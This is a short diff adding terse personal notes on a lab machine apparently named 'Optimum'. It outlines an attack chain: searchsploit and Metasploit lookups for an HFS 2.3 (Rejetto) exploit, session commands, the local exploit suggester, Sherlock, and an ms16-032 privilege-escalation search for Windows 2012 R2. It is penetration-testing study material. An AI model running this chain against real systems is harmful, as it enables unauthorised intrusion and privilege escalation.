@@ -1,0 +1,28 @@
+OPTIMUM?
+
+searchsploit hfs 2.3
+Goo hfs 2.3 exploit
+
+msfconsole
+search rejetto
+
+set lhost tun0 (**)
+sysinfo
+getuid
+background (for privilege escalation)
+
+use post/multi/recon/local_exploit_suggester
+set session 1
+
+Goo: windows privilege escalation (fuzzy security)
+sherlock rastamouse
+
+sessions 1
+Goo:
+Windows 2012 R2 (6.3 Build 9600) privilege escalation
+
+
+
+msf> search ms16-032
+
+
